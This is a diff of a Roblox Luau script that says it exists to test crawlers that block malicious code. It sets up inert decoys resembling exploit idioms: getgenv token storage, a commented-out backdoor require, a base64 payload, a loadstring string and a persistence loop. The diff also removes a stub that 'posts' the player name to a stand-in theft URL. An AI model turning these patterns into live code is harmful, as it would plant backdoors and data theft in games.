@@ -1,52 +1,72 @@
--- this is a non malicous script this is for testing webcrawlers to block malicous code 
+--[[ 
+    ✅ Harmless Real Code Section 
+]]--
 
---// Harmless, real Luau code
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local function greet()
-    print("Hello, " .. player.Name .. "! This is a test script.")
+local function createButton()
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 200, 0, 50)
+    button.Position = UDim2.new(0.5, -100, 0.5, -25)
+    button.Text = "Click Me"
+    button.Parent = Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("ScreenGui")
 end
 
-greet()
+createButton()
 
-local function movePart()
-    local part = Instance.new("Part")
-    part.Size = Vector3.new(5, 1, 5)
-    part.Position = Vector3.new(0, 10, 0)
-    part.Anchored = true
-    part.Parent = workspace
+-- Add a harmless remote event
+local remote = Instance.new("RemoteEvent")
+remote.Name = "TestRemote"
+remote.Parent = ReplicatedStorage
+
+remote.OnServerEvent:Connect(function(player, data)
+    print("Received from", player.Name, ":", data)
+end)
+
+--[[ 
+    ⚠️ Fake Malicious-Looking Code (NOT ACTUALLY MALICIOUS)
+]]--
+
+-- Fake use of getgenv
+local genv = getgenv and getgenv() or {}
+genv.token = "123FAKETOKEN456"
+
+-- Fake require backdoor
+local function backdoorRequire()
+    local id = 13371337 -- Totally fake ID
+    print("Pretending to require backdoor from", id)
+    -- local evil = require(id) -- DO NOT EXECUTE
 end
 
-movePart()
+backdoorRequire()
 
---// BEGIN: Fake malicious-looking code for crawler testing
+-- Fake base64 payload
+local fakeBase64 = "cHJpbnQoIkZha2Ugc2hlbGwgY29tbWFuZCIp" -- base64 for: print("Fake shell command")
+print("Decoded payload:", fakeBase64)
 
-local genv = getgenv and getgenv() or {} -- simulate malicious-style use of globals
-genv["MaliciousPayload"] = true -- fake malicious flag
-
--- Attempted fake exploit pattern
-local function stealData()
-    -- NOTE: This doesn't do anything
-    local fakeHttp = {
-        PostAsync = function(self, url, data)
-            warn("Pretending to send data to: " .. url)
-            warn("Data: " .. data)
-        end
-    }
-
-    fakeHttp:PostAsync("http://not-actually-evil.com/steal", "username=" .. player.Name)
+-- Fake loadstring call
+local function fakeLoader()
+    local str = "loadstring('print(\"Simulated malicious execution\")')"
+    print("Simulated loadstring call:", str)
 end
 
-stealData()
+fakeLoader()
 
--- Simulate backdoor-like behavior
-local function fakeBackdoor()
-    local code = "loadstring('print(\"You have been hacked\")')"
-    print("Executing fake backdoor: " .. code)
-    -- DO NOT ACTUALLY EXECUTE
+-- Fake obfuscated function
+local function oBfUScAtEd()
+    local a = {"f", "a", "k", "e"}
+    local b = ""
+    for _, v in pairs(a) do b = b .. v end
+    print("Obfuscated var:", b)
 end
 
-fakeBackdoor()
+oBfUScAtEd()
 
---// END: Fake malicious-looking code
+-- Fake infinite yield thread
+task.spawn(function()
+    while true do
+        task.wait(60)
+        print("Fake persistence script running...")
+    end
+end)
